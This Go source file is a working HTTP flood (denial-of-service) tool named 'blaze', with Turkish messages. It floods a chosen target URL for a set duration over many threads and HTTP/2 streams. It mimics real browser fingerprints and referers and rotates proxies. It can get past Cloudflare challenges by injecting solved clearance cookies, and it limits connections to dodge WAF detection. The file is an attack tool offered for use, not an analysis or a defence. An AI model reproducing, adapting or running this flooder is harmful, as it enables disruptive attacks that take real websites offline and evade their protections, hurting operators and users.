package main

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	gofire "github.com/JSInvasor/Gohttp-clientfingerprintemulateandfastest"
)

func main() {
	if len(os.Args) < 4 {
		fmt.Println("kullanim: blaze <url> <sure_sn> <thread> [stream] [method] [proxy|proxy_dosya] [--solve]")
		fmt.Println()
		fmt.Println("ornek:    ./blaze https://hedef.com 60 64 32")
		fmt.Println("ornek:    ./blaze https://hedef.com 60 128 50 GET socks5://127.0.0.1:1080")
		fmt.Println("ornek:    ./blaze https://hedef.com 60 40 40 GET --solve")
		fmt.Println()
		fmt.Println("flaglar:")
		fmt.Println("  --solve    cloudflare challenge coz (puppeteer-real-browser gerektirir)")
		fmt.Println("             ilk kullanim: cd solver && npm install")
		fmt.Println()
		fmt.Println("proxy dosya formati (satir satir):")
		fmt.Println("  ip:port")
		fmt.Println("  ip:port:user:pass")
		fmt.Println("  socks5://ip:port")
		fmt.Println("  http://user:pass@ip:port")
		os.Exit(1)
	}

	targetURL := os.Args[1]
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "https://" + targetURL
	}

	durSec := mustInt(os.Args[2], "sure")
	threads := mustInt(os.Args[3], "thread")

	streams := 32
	method := "GET"
	proxyArg := ""
	solve := false

	// Parse remaining args - positional + flags
	posArgs := []string{}
	for _, arg := range os.Args[4:] {
		if arg == "--solve" {
			solve = true
		} else {
			posArgs = append(posArgs, arg)
		}
	}
	if len(posArgs) >= 1 {
		streams = mustInt(posArgs[0], "stream")
	}
	if len(posArgs) >= 2 {
		method = strings.ToUpper(posArgs[1])
	}
	if len(posArgs) >= 3 {
		proxyArg = posArgs[2]
	}

	// Solve Cloudflare challenge if --solve flag is set
	var solvedCookies string
	if solve {
		var err error
		solvedCookies, err = solveCFChallenge(targetURL)
		if err != nil {
			fmt.Fprintf(os.Stderr, "hata: challenge cozulemedi: %v\n", err)
			os.Exit(1)
		}
	}

	run(targetURL, durSec, threads, streams, method, proxyArg, solvedCookies)
}

// solverResult is the JSON output from solver/index.js
type solverResult struct {
	Status    string `json:"status"`
	URL       string `json:"url"`
	UserAgent string `json:"user_agent"`
	Cookies   string `json:"cookies"`
	Error     string `json:"error"`
}

// solveCFChallenge runs the Node.js solver to get cf_clearance cookie.
func solveCFChallenge(targetURL string) (string, error) {
	fmt.Println("cloudflare challenge cozuluyor...")

	// Find solver script relative to executable or cwd
	solverPaths := []string{
		"solver/index.js",
		"./solver/index.js",
	}

	var solverPath string
	for _, p := range solverPaths {
		if _, err := os.Stat(p); err == nil {
			solverPath = p
			break
		}
	}
	if solverPath == "" {
		return "", fmt.Errorf("solver/index.js bulunamadi. 'cd solver && npm install' calistirin")
	}

	// Check if node_modules exists
	if _, err := os.Stat("solver/node_modules"); os.IsNotExist(err) {
		return "", fmt.Errorf("solver/node_modules bulunamadi. 'cd solver && npm install' calistirin")
	}

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "node", solverPath, targetURL, "45")
	cmd.Stderr = os.Stderr
	output, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf("solver calistirilamadi: %w", err)
	}

	var result solverResult
	if err := json.Unmarshal(output, &result); err != nil {
		return "", fmt.Errorf("solver ciktisi okunamadi: %w\ncikti: %s", err, string(output))
	}

	if result.Status == "error" {
		return "", fmt.Errorf("solver hatasi: %s", result.Error)
	}

	if result.Cookies == "" {
		return "", fmt.Errorf("solver cookie dondurmedi (status: %s)", result.Status)
	}

	fmt.Printf("challenge cozuldu! status: %s\n", result.Status)
	if result.Status == "no_clearance" {
		fmt.Println("uyari: cf_clearance cookie bulunamadi, mevcut cookie'ler kullanilacak")
	}

	return result.Cookies, nil
}

// clientGroup holds multiple clients of the same browser type for connection multiplying.
type clientGroup struct {
	name      string
	clients   []*gofire.Client
	pipelines []*gofire.Pipeline
}

func (cg *clientGroup) Close() {
	for _, p := range cg.pipelines {
		p.Close()
	}
	for _, c := range cg.clients {
		c.Close()
	}
}

func (cg *clientGroup) ActiveConnections() int64 {
	var total int64
	for _, c := range cg.clients {
		total += c.ActiveConnections()
	}
	return total
}

func run(targetURL string, durSec, threads, streams int, method, proxyArg, solvedCookies string) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	// Scale total connections with thread count for higher RPS.
	// Each client = 1 HTTP/2 connection = ~256 concurrent streams.
	// More connections = more concurrent streams = higher throughput.
	// Cap at 40 to avoid WAF connection-count detection.
	totalTargetClients := threads
	if totalTargetClients > 40 {
		totalTargetClients = 40
	}
	if totalTargetClients < 10 {
		totalTargetClients = 10
	}

	idlePerHost := 256
	totalIdle := 1024

	baseOpts := []gofire.Option{
		gofire.WithTimeout(10 * time.Second),
		gofire.WithTLSHandshakeTimeout(8 * time.Second),
		gofire.WithDialTimeout(8 * time.Second),
		gofire.WithMaxIdleConnsPerHost(idlePerHost),
		gofire.WithMaxIdleConns(totalIdle),
		gofire.WithMaxConnsPerHost(0),
		gofire.WithDNSCacheTTL(30 * time.Minute),
		gofire.WithIdleConnTimeout(120 * time.Second),
		gofire.WithMaxRedirects(3),
		gofire.WithWriteBufferSize(128 * 1024),
		gofire.WithReadBufferSize(128 * 1024),
	}

	// Per-browser referers - each browser uses a realistic search engine referer.
	browserReferers := map[string]string{
		"safari":  "https://www.google.com/search?client=safari&channel=iphone_bm",
		"chrome":  "https://www.google.com/",
		"firefox": "https://duckduckgo.com/",
	}

	// Detect proxy mode
	var proxyRotator *gofire.ProxyRotator
	if proxyArg != "" {
		if isProxyFile(proxyArg) {
			var err error
			proxyRotator, err = gofire.NewProxyRotatorFromFile(proxyArg)
			if err != nil {
				fmt.Fprintf(os.Stderr, "hata: proxy dosyasi yuklenemedi: %v\n", err)
				os.Exit(1)
			}
		} else {
			baseOpts = append(baseOpts, gofire.WithProxy(proxyArg))
		}
	}

	// Parse solved cookies into []*http.Cookie for injection
	var parsedCookies []*http.Cookie
	if solvedCookies != "" {
		parsedCookies = parseCookieHeader(solvedCookies)
		fmt.Printf("cookie: %d adet yuklendi\n", len(parsedCookies))
	}

	// Create multiple clients per browser with weighted distribution.
	// Safari 40%, Chrome 30%, Firefox 30%
	type browserSpec struct {
		name    string
		profile gofire.BrowserProfile
		clients int
	}

	safariClients := totalTargetClients * 4 / 10
	chromeClients := totalTargetClients * 3 / 10
	firefoxClients := totalTargetClients - safariClients - chromeClients
	if safariClients < 2 {
		safariClients = 2
	}
	if chromeClients < 1 {
		chromeClients = 1
	}
	if firefoxClients < 1 {
		firefoxClients = 1
	}

	browsers := []browserSpec{
		{"firefox", gofire.Firefox148, firefoxClients},
		{"chrome", gofire.Chrome146, chromeClients},
		{"safari", gofire.SafariIOS18, safariClients},
	}

	groups := make([]*clientGroup, len(browsers))

	totalClients := 0
	for _, bs := range browsers {
		totalClients += bs.clients
	}
	workersPerClient := (threads * streams) / totalClients
	if workersPerClient < 1 {
		workersPerClient = 1
	}

	for bi, bs := range browsers {
		cg := &clientGroup{name: bs.name}

		opts := append(baseOpts, gofire.WithReferer(browserReferers[bs.name]))

		for i := 0; i < bs.clients; i++ {
			c, err := gofire.Emulate(bs.profile, opts...)
			if err != nil {
				fmt.Fprintf(os.Stderr, "hata: %s client[%d] olusturulamadi: %v\n", bs.name, i, err)
				os.Exit(1)
			}
			if proxyRotator != nil {
				c.SetProxyRotator(proxyRotator)
			}
			// Inject solved cookies into client's cookie jar
			if len(parsedCookies) > 0 {
				_ = c.SetCookies(targetURL, parsedCookies)
			}
			// Pre-build request template for FastDo path
			tmpl, err := c.PrepareRequest(method, targetURL)
			if err != nil {
				fmt.Fprintf(os.Stderr, "hata: %s template olusturulamadi: %v\n", bs.name, err)
				os.Exit(1)
			}
			// Inject cookie header directly into template for FastDo path
			// (FastDo bypasses cookie jar, so we must set it on the template)
			if solvedCookies != "" {
				tmpl.Header.Set("Cookie", solvedCookies)
			}
			p := c.NewPipeline(workersPerClient)
			p.SetTemplate(tmpl)
			cg.clients = append(cg.clients, c)
			cg.pipelines = append(cg.pipelines, p)
		}
		groups[bi] = cg
	}
	defer func() {
		for _, cg := range groups {
			cg.Close()
		}
	}()

	actualWorkers := workersPerClient * totalClients
	fmt.Printf("hedef: %s | sure: %ds | worker: %d (%d/client) | method: %s\n",
		targetURL, durSec, actualWorkers, workersPerClient, method)
	fmt.Printf("browser: %d safari(40%%) + %d chrome(30%%) + %d firefox(30%%) client (toplam %d baglanti)\n",
		safariClients, chromeClients, firefoxClients, totalClients)
	if solvedCookies != "" {
		fmt.Println("mode: cf-bypass (cookie injected)")
	}
	if proxyRotator != nil {
		fmt.Printf("proxy: %d adet (rotate)\n", proxyRotator.Count())
	} else if proxyArg != "" {
		fmt.Printf("proxy: %s\n", proxyArg)
	}

	// Test one client per browser
	for _, cg := range groups {
		fmt.Printf("test [%s]... ", cg.name)
		testCtx, testCancel := context.WithTimeout(context.Background(), 15*time.Second)
		resp, testErr := cg.clients[0].DoWithContext(testCtx, method, targetURL, nil, nil)
		testCancel()
		if testErr != nil {
			fmt.Printf("BASARISIZ: %v\n", testErr)
		} else {
			fmt.Printf("OK %d\n", resp.StatusCode())
			resp.Close()
		}
	}

	// Pre-warm all clients
	fmt.Print("baglanti isitiliyor... ")
	warmCtx, warmCancel := context.WithTimeout(context.Background(), 10*time.Second)
	warmPerClient := 4
	for _, cg := range groups {
		for _, c := range cg.clients {
			_ = c.PreConnect(warmCtx, targetURL, warmPerClient)
		}
	}
	warmCancel()

	var totalConns int64
	for _, cg := range groups {
		totalConns += cg.ActiveConnections()
	}
	fmt.Printf("%d baglanti\n", totalConns)

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(durSec)*time.Second)
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		fmt.Println("\ndurduruluyor...")
		cancel()
	}()

	var (
		totalSent    atomic.Int64
		totalSuccess atomic.Int64
		totalFailed  atomic.Int64
		statusCodes  sync.Map
		errMu        sync.Mutex
		recentErrs   []string
		errCountMap  sync.Map
	)

	startTime := time.Now()
	fmt.Printf("basliyor... %d worker x %d client\n\n", actualWorkers, totalClients)

	onResult := func(resp *gofire.Response, err error, latency time.Duration) {
		totalSent.Add(1)
		if err != nil {
			totalFailed.Add(1)

			errStr := err.Error()
			if len(errStr) > 200 {
				errStr = errStr[:200]
			}
			if _, loaded := errCountMap.LoadOrStore(errStr, &atomic.Int64{}); !loaded {
				errMu.Lock()
				if len(recentErrs) < 5 {
					recentErrs = append(recentErrs, errStr)
				}
				errMu.Unlock()
			}
			if val, ok := errCountMap.Load(errStr); ok {
				val.(*atomic.Int64).Add(1)
			}
		} else {
			totalSuccess.Add(1)
			if resp != nil {
				sc := resp.StatusCode()
				val, _ := statusCodes.LoadOrStore(sc, &atomic.Int64{})
				val.(*atomic.Int64).Add(1)
			}
		}
	}

	for _, cg := range groups {
		for _, p := range cg.pipelines {
			p.OnResult = onResult
		}
	}

	var feedWg sync.WaitGroup
	feedPipeline := func(pipeline *gofire.Pipeline) {
		defer feedWg.Done()
		for {
			select {
			case <-ctx.Done():
				return
			default:
			}
			pipeline.FireAndForget(ctx, method, targetURL, nil, nil)
		}
	}

	feedersPerPipeline := 4
	for _, cg := range groups {
		for _, p := range cg.pipelines {
			for i := 0; i < feedersPerPipeline; i++ {
				feedWg.Add(1)
				go feedPipeline(p)
			}
		}
	}

	// Stats printer
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		var lastSent int64
		var peakRPS int64

		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				sent := totalSent.Load()
				ok := totalSuccess.Load()
				fail := totalFailed.Load()
				elapsed := time.Since(startTime).Seconds()

				rps := sent - lastSent
				lastSent = sent
				if rps > peakRPS {
					peakRPS = rps
				}

				var conns int64
				for _, cg := range groups {
					conns += cg.ActiveConnections()
				}

				fmt.Printf("\rsent:%d ok:%d fail:%d rps:%d peak:%d conn:%d %.0fs   ",
					sent, ok, fail, rps, peakRPS, conns, elapsed)
			}
		}
	}()

	feedWg.Wait()

	totalDuration := time.Since(startTime)
	sent := totalSent.Load()
	ok := totalSuccess.Load()
	fail := totalFailed.Load()

	avgRPS := float64(0)
	if totalDuration.Seconds() > 0 {
		avgRPS = float64(sent) / totalDuration.Seconds()
	}
	successRate := float64(0)
	if sent > 0 {
		successRate = float64(ok) / float64(sent) * 100
	}

	var finalConns int64
	for _, cg := range groups {
		finalConns += cg.ActiveConnections()
	}

	fmt.Printf("\n\n--- sonuclar ---\n")
	fmt.Printf("gonderilen: %d\n", sent)
	fmt.Printf("basarili:   %d (%%%.1f)\n", ok, successRate)
	fmt.Printf("basarisiz:  %d\n", fail)
	fmt.Printf("sure:       %v\n", totalDuration.Round(time.Millisecond))
	fmt.Printf("ort. rps:   %.0f req/s\n", avgRPS)
	fmt.Printf("baglanti:   %d (%d client)\n", finalConns, totalClients)

	hasStatus := false
	statusCodes.Range(func(key, value interface{}) bool {
		if !hasStatus {
			fmt.Println("\nstatus kodlari:")
			hasStatus = true
		}
		fmt.Printf("  %d: %d\n", key.(int), value.(*atomic.Int64).Load())
		return true
	})

	errMu.Lock()
	if len(recentErrs) > 0 {
		fmt.Println("\nhatalar:")
		for _, e := range recentErrs {
			count := int64(0)
			if val, ok := errCountMap.Load(e); ok {
				count = val.(*atomic.Int64).Load()
			}
			fmt.Printf("  [%dx] %s\n", count, e)
		}
	}
	errMu.Unlock()

	fmt.Println()
}

// parseCookieHeader parses a "name=value; name2=value2" string into []*http.Cookie.
func parseCookieHeader(raw string) []*http.Cookie {
	header := http.Header{}
	header.Add("Cookie", raw)
	req := http.Request{Header: header}
	return req.Cookies()
}

// isProxyFile checks if the argument is a file path (vs a proxy URL).
func isProxyFile(s string) bool {
	if strings.Contains(s, "://") {
		return false
	}
	if _, err := os.Stat(s); err == nil {
		return true
	}
	if strings.HasSuffix(s, ".txt") || strings.HasSuffix(s, ".list") || strings.HasSuffix(s, ".csv") {
		return true
	}
	return false
}

func mustInt(s, name string) int {
	v, err := strconv.Atoi(s)
	if err != nil || v <= 0 {
		fmt.Fprintf(os.Stderr, "hata: gecersiz %s: %s\n", name, s)
		os.Exit(1)
	}
	return v
}

